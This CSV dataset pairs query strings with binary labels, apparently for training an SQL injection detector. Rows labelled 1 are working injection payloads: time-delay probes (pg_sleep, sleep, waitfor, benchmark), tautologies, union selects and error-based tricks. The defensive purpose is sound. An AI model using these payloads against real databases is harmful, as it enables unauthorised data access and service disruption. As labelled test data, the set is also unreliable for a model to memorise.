query,label
select wrong from than union all select steam from send order by porch,0
select pg_sleep  (  5  )   and    (    (     (  'qslr'  =  'qslr,1
"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )",1
select count ( tent ) from practical,0
-9975 where 9760  =  9760 order by 1--,1
"select monkey, operation+ ', ' + finger+ ' ' + tool+ ', ' + speed as built  from development",0
1   )    )     )   order by 1--,1
merriell,0
select min ( customs )  as telephone from zipper,0
yaci,0
select * from ground_stations where status = 'active' or 'x'='x',1
"select * from sometime where pan in  ( 'slowly', 'climate', 'dangerous' )",0
sotobaado y priorato,0
"calle dinamarca 14,",0
madisett,0
freydig rueda,0
6.74367e+15,0
1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,1
"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl",1
"(  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )",1
1.13313e+15,0
diafragmar,0
"select * from generate_series  (  5980,5980,case when   (  5980  =  5063  )   then 1 else 0 end  )   limit 1--",1
select count ( distinct hold )  from organization,0
"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
18567,0
select avg ( act ) from service select sum ( program ),0
"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '",1
55950989q,0
-9673  )   or 8571  =  8571--,1
select * from leader where stairs between '1996-07-01' and '1996-07-31',0
select * from straw  where exciting = halfway,0
select * from handsome fetch first 3 rows only select top 50 percent * from except,0
telsfora,0
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
1  )   where 1929  =  1929 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
algu chavarri,0
select * from short where    not want = 'twelve',0
1   )    )    and 9198  =  9198--,1
c356conio,0
vir7eino,0
delete from thumb where rise = 'review',0
select * from more where discover = 'part'  or cent = 'silent',0
2.61077e+15,0
darcange1,0
alobras,0
"select employees.thirty, count ( orders.mightyid )  as peoplefrom    ( ordersinner join plus on orders.receiveid  =  employees.mainid )",0
26222,0
"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",1
select min ( recent )  as bring from sense,0
"insert into help ( grandfather, lungs, trail, time, closer, tongue )  values  ( 'mistake', 'means'. surprise', 'outer', 'porch', 'beside', 'captain' )",0
"calle robert gerhard, s/n 6c",0
v70t4oso,0
select count ( distinct judge )  from month,0
select * from  ( select life from paid ),0
"1""   )    )    as spvl where 2242  =  2242 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1
